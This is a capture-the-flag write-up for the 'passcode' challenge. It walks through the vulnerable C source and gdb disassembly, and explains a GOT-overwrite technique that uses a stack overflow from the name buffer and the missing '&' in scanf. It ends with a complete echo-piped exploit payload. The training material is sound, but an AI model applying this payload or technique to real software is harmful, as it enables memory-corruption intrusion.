# problem reqs
when you login to machine

```
passcode@pwnable:~$ ls -l 

total 16
-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
-r-xr-sr-x 1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c

```

passcode.c

```
#include <stdio.h>  
#include <stdlib.h> 

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}
void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();  
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;   
}


```

# thought process
clearly scanf is at fault here. Like `&` is missing and when you try to put integer to it, program crasshes. So we would have to find another way to put "junk" values in passcode1 and passcode2.

We see that in the welcome function `char[100] name` asks for the input. It gives me the hunch that I could explore the buffer overflow route.

Let's explore welcome function with gdb
```
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   ebp
   0x0804860a <+1>:     mov    ebp,esp
   0x0804860c <+3>:     sub    esp,0x88
   0x08048612 <+9>:     mov    eax,gs:0x14
   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:    xor    eax,eax
   0x0804861d <+20>:    mov    eax,0x80487cb
   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    eax,0x80487dd
   0x0804862f <+38>:    lea    edx,[ebp-0x70]
   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    eax,0x80487e3
   0x08048643 <+58>:    lea    edx,[ebp-0x70]
   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]

```
We see `lea    edx,[ebp-0x70]`. This should be `char[100]`. Cool!
Let's disassembly login function
```
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     sub    esp,0x28
   0x0804856a <+6>:     mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9

```
here I have shown only the relevant part. Notice the following lines

```
0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
0x080485cc <+104>:   jne    0x80485f1 <login+141>
0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
```
338150 in hex is 0x528E6. Required value of passcode1
13371337 in hex is 0xcc07c9. Required value of passcode2
Beautiful!

So next thing that comes in mind is can we set the both values in login function using welcome function?
Let's see `char[100]` started from `epb-0x70` and passcode1 is at `ebp-0x10`.

if we check the difference between both of these 
```
(gdb) p/d 0x70-0x10
$1 = 96

```
It's 96. 96 bytes. sweet. So seems like I can control the value of passcode1. But how do I control the value of passcode2??
One point to note here is that in the original code `scanf("%100s", name);` only accepts 100 bytes only.

hmmmm....

Here I was out of my depths. So after researching on the internet, I found about GOT hijacking. GOT is global offset table. So basically when a C program is compiled into a binary, not all the functions are resolved. Especially the functions in shared libraries like printf, system(...), scanf() etc. It's linkers responsiblity to find them and once it finds them, then it places there address in the GOT. It works more like on-demand feature. When a function is required, linker will fetch it and place it's address in GOT and then if this function is required again, it'll be present there.
If you didn't understand, what I am talking about I encourage you to read about it on wikipedia and other tons of articles and come back.

Cool!

How do we exploit this?
If you note the scanf function of login function, we `&` is missing. Normaly scanf takes the value from `stdin` and the put the value at the address of variable(in the second argument of scanf). But this time, it will take the value from `stdin` and put the value into the address pointed to by value of passcode1.

Let's summarise what we have learnt till now:
- we could influence the value of passcode1.
- we could overrite the value of the address pointed by value of passcode1.

If you would have run the program and given the input to passcode1, you would have noticed that program crashed(or core dumped). That is because passcode1 had a junk value. That value didn't wasn't mapped to any real address. So the plan for our exploit is we would give passcode1 a valid address as a 'junk' value and then overrite that address's value with our target value.

Ok, if you understood how GOT works is you would realise that every function has their address stored in GOT. So even `fflush()` would have their entry in GOT and will system() function have. I feel we have something brewing up here. Let's see

When fflush() is executed, program execution will got to GOT to find the address of fflush. it's not there, so the linker will go ahead and find the address and then put the value in it. What if put some address there before all this search and find takes place? seems interesting.

let's disassemble login again for a sec

```
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
```
alright I think, in the GOT entry of fflush we would put the address `0x080485e3`(second from last). 

When I was reading writeups, I was confused as to why not put address `0x080485ea` cuz that's where the call to `system` takes place. But the thing it loads the arguments to `system` function at the address `0x080485ea`. That's why we put that address in the fflush.

Cool! 

Let's begin our attack. Since passcode1 value is asked in decimal, 0x080485e3 is 134514147.

(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x04\x08134514147") | ./passcode


this should give you the flag. yipee!

# solution
